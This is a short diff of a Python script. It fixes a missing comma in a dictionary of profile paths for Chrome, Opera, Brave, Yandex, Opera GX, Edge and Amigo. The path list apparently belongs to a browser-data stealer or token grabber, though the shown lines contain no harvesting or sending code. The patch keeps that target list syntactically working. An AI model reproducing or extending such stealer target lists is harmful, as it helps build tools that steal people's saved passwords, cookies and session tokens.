@@ -51,7 +51,7 @@ def main():
         'Google Chrome': local + r'\\Google\\Chrome\\User Data\\Default',
         'Opera': roaming + r'\\Opera Software\\Opera Stable',
         'Brave': local + r'\\BraveSoftware\\Brave-Browser\\User Data\\Default',
-        'Yandex': local + r'\\Yandex\\YandexBrowser\\User Data\\Default'
+        'Yandex': local + r'\\Yandex\\YandexBrowser\\User Data\\Default',
         'Opera GX': roaming + r'\\Opera Software\\Opera GX Stable',
         'Edge': roaming + r'\\Microsoft\\Edge\\User Data',
         'Amigo': local + r'\\Amigo\\User Data',
